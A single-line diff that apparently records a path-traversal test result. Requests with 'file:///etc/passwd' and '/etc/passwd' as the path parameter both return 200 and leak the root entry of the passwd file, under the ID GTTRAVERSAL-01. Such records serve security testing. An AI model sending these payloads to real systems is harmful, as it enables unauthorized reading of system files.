@@ -1,0 +1,1 @@
+?path=file:///etc/passwd 与 ?path=/etc/passwd 均 200 GTTRAVERSAL-01 root:x:0:0:root（scheme/绝对双形）
